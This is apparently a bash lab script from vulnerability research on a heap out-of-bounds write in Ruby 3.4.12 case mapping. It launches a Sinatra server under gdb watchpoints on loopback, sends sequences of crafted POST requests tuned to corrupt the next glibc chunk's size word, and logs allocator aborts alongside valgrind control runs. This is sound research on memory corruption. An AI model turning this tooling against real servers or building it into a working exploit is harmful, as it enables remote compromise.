#!/bin/bash
# W383: on the W382 1024 SURVIVOR family, add a THIRD wire request in the
# SAME fresh plain 3.4.12 Sinatra process under the committed W379 hardware
# WRITE watchpoints (observability only, no debugger writes). Request 1 is
# always post-field length 64 and request 2 always 1024; only the third
# request's post-field length varies. N=27 is the count whose OOB byte rewrites
# the next glibc chunk's size LSB (W381).
#
# Prediction (operator #7282): a later allocation unlinks the corrupted fold
# chunk and aborts. Falsifier: a survivor serves a third request with no
# allocator fault, leaving a persistent corrupted-sizeword process.
#
# Usage (paths relative to the repository root, free loopback ports required):
#   bash lab/repro/ruby2shell-w383-third-request.sh arms 4890 \
#       lab/build/evidence/casemap-chain/w383/arms 4
#   bash lab/repro/ruby2shell-w383-third-request.sh controls 4910 \
#       lab/build/evidence/casemap-chain/w383/controls
#
# Each arm checks its port first: a stale server would let curl readiness
# succeed while the intended process died EADDRINUSE. The Nth arm of a round
# uses FIRSTPORT+N; with ROUNDS=4 the 20 arms use FIRSTPORT..FIRSTPORT+19.
set -u
cd "$(dirname "$0")/../.." || exit 1
MODE="${1:-}" FIRSTPORT="${2:-}" OUT="${3:-}" ROUNDS="${4:-1}"
case "$MODE" in
  arms) lens=(1 64 256 1024 4096) ;;
  controls) lens=(0 1) ;;
  *) echo "usage: $0 arms|controls FIRSTPORT OUTDIR [ROUNDS]" >&2; exit 2 ;;
esac
case "$FIRSTPORT" in ''|*[!0-9]*) echo "FIRSTPORT must be a port number" >&2; exit 2 ;; esac
case "$ROUNDS" in ''|*[!0-9]*) echo "ROUNDS must be a number" >&2; exit 2 ;; esac
[ "$ROUNDS" -ge 1 ] || { echo "ROUNDS must be >= 1" >&2; exit 2; }
[ -n "$OUT" ] || { echo "OUTDIR required" >&2; exit 2; }
mkdir -p "$OUT" || exit 1
SUMMARY="$OUT/summary.txt"
: > "$SUMMARY"

GDBSCRIPT="$PWD/lab/repro/ruby2shell-w379-wire-watch.gdb"
VGEMS="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
VBIN="$PWD/lab/build/plain/ruby-3.4.12-plain/bin/ruby"
APP="$PWD/lab/repro/ruby2shell-stock-baseline.ru"
WIRE="$PWD/lab/repro/ruby2shell-w371-wire.py"

port_free() {
  if ss -ltn 2>/dev/null | grep -qE "[:.]$1[[:space:]]"; then
    echo "port $1 busy; arm SKIPPED" | tee -a "$SUMMARY"
    return 1
  fi
  return 0
}

wire_request() {
  # wire_request PORT POSTLEN OUTPUT
  RUBY2SHELL_W371_SURFACES=method-postfield-size \
  RUBY2SHELL_W377_POSTLEN="$2" \
  RUBY2SHELL_W378_COUNT=1 RUBY2SHELL_W380_COUNT=27 \
  RUBY2SHELL_W376_RESPONSE=1 \
    python3 "$WIRE" "$1" POST > "$3" 2>&1
}

arm() {
  local third="$1" port="$2" round="$3" tag="r${round}-third-$third"
  local out="$OUT/$tag.gdb.out"
  local w1="$OUT/$tag.wire1" w2="$OUT/$tag.wire2" w3="$OUT/$tag.wire3"
  local gdbpid child ready=NO alive=NO abort=NO unlink=NO
  local r1=NO r2=NO r3=NO
  port_free "$port" || return 2
  echo "== START $tag port=$port first=64 second=1024 third=$third $(date -u +%H:%M:%SZ)"
  export GEM_PATH="$VGEMS${GEM_PATH:+:$GEM_PATH}"
  export RUBY2SHELL_STOCK_PORT="$port"
  export R2S_W379_ABORT_BT=1
  setsid gdb -q -batch -x "$GDBSCRIPT" --args "$VBIN" "$APP" > "$out" 2>&1 &
  gdbpid=$!
  for _ in $(seq 1 240); do
    child=$(pgrep -P "$gdbpid" | head -1)
    if curl -s -m 1 "http://127.0.0.1:$port/" >/dev/null 2>&1; then ready=YES; break; fi
    sleep 0.25
  done
  if [ "$ready" = YES ]; then
    wire_request "$port" 64 "$w1"
    wire_request "$port" 1024 "$w2"
    wire_request "$port" "$third" "$w3"
    sleep 2
    if kill -0 "$child" 2>/dev/null; then alive=YES; fi
  fi
  grep -qE '^surface=.*response-len=[1-9]' "$w1" && r1=YES
  grep -qE '^surface=.*response-len=[1-9]' "$w2" && r2=YES
  grep -qE '^surface=.*response-len=[1-9]' "$w3" && r3=YES
  if grep -qiE 'corrupted size|malloc_printerr|SIGABRT|Aborted' "$out"; then abort=YES; fi
  if grep -qiE 'unlink_chunk|_int_realloc|malloc_printerr' "$out"; then unlink=YES; fi
  kill -TERM "$child" 2>/dev/null
  for _ in $(seq 1 60); do kill -0 "$gdbpid" 2>/dev/null || break; sleep 0.1; done
  kill -KILL "$gdbpid" 2>/dev/null
  wait "$gdbpid" 2>/dev/null
  {
    echo "== $tag port=$port ready=$ready r1=$r1 r2=$r2 r3=$r3 alive=$alive abort=$abort unlink_frame=$unlink"
    echo "-- request1 (postlen=64)"
    grep -E '^surface=.*(head|response-len)' "$w1" | cut -c1-120 || true
    echo "-- request2 (postlen=1024)"
    grep -E '^surface=.*(head|response-len)' "$w2" | cut -c1-120 || true
    echo "-- request3 (postlen=$third)"
    grep -E '^surface=.*(head|response-len)' "$w3" | cut -c1-120 || true
    echo "-- fold calls, traps and summary (sizeword is pre-write; trap dump +8 is the next chunk's sizeword)"
    grep -E '^W379CALL' "$out" | cut -c1-200 || true
    grep -E '^W379TRAP' "$out" | cut -c1-300 || true
    grep -E '^W379SUMMARY' "$out" || true
    echo "-- abort frames (full backtrace on abort when R2S_W379_ABORT_BT=1)"
    grep -A14 '^W382ABORT_BT' "$out" | head -15 || true
    grep -iE 'corrupted size vs|malloc_printerr|unlink_chunk|_int_realloc|SIGABRT' "$out" | head -6 || true
  } >> "$SUMMARY"
  echo "== $tag ready=$ready r1=$r1 r2=$r2 r3=$r3 alive=$alive abort=$abort unlink=$unlink"
}

control() {
  local kind="$1" app="$2" build="$3" sharp="$4" surface="$5" port="$6" tag="$7"
  port_free "$port" || return 2
  echo "== START $tag ($kind $app $build sharp=$sharp $surface) $(date -u +%H:%M:%SZ)"
  RUBY2SHELL_W369_PORT="$port" \
  RUBY2SHELL_W369_WIRE=lab/repro/ruby2shell-w371-wire.py \
  RUBY2SHELL_W371_SURFACES="$surface" \
  RUBY2SHELL_W377_POSTLEN=64 RUBY2SHELL_W380_COUNT="$sharp" \
  RUBY2SHELL_W376_RESPONSE=1 RUBY2SHELL_W369_TAG="$tag" \
    bash lab/repro/ruby2shell-w369-pair.sh "$kind" "$app" "$build"
  local vg="lab/build/evidence/casemap-chain/w369/valgrind-${app}-${build}/${tag}.valgrind"
  local cout="lab/build/evidence/casemap-chain/w369/valgrind-${app}-${build}/${tag}.out"
  {
    echo "== $tag (sharp=$sharp $app $build $surface)"
    grep -E '^(invalid-writes|invalid-reads|case_map-errors|ready=|process-alive)' "$cout" || true
    grep -iE 'at 0x[0-9a-f]+: case_map' "$vg" | sort | uniq -c || true
    grep -iE 'Address 0x[0-9a-f]+ is [0-9]+ bytes (after|before|inside) a block of size [0-9]+' "$vg" | sort | uniq -c || true
  } >> "$SUMMARY"
}

if [ "$MODE" = arms ]; then
  i=0
  for round in $(seq 1 "$ROUNDS"); do
    for third in "${lens[@]}"; do
      arm "$third" "$((FIRSTPORT+i))" "$round"
      i=$((i+1))
    done
  done
  [ "$i" -eq $((ROUNDS*5)) ] || { echo "expected $((ROUNDS*5)) arms, ran $i" | tee -a "$SUMMARY"; exit 2; }
else
  control valgrind sinatra vuln 20 method-postfield-size-safe "$FIRSTPORT" w383-vg-safe20
  control valgrind rails fixed 27 method-postfield-size "$((FIRSTPORT+1))" w383-vg-fixed27
fi
cat "$SUMMARY"
